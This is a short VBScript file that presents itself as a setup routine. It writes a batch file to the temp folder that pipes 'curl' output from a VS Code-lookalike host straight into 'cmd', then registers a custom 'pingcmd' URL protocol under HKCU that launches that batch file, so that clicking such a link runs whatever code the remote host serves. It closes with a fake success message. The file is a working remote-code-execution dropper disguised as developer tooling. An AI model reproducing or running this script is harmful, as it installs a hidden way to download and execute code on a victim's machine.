Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Get temp directory
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
handlerPath = tempDir & "\pingcmd-handler.bat"

' Create handler batch file that executes the command
Set handlerFile = fso.CreateTextFile(handlerPath, True)
handlerFile.WriteLine "@echo off"
handlerFile.WriteLine "curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd"
handlerFile.Close

' Register protocol handler (HKCU doesn't need admin for most users)
On Error Resume Next
WshShell.RegWrite "HKCU\Software\Classes\pingcmd\", "URL: Ping Command Protocol"
WshShell.RegWrite "HKCU\Software\Classes\pingcmd\URL Protocol", ""
WshShell.RegWrite "HKCU\Software\Classes\pingcmd\shell\open\command\", Chr(34) & handlerPath & Chr(34) & " ""%1"""

If Err.Number = 0 Then
    ' Success - close window automatically
    CreateObject("WScript.Shell").Run "cmd /c echo Setup completed successfully!", 0, True
    WScript.Quit 0
Else
    ' May need admin - try HKCU first
    WScript.Quit 1
End If

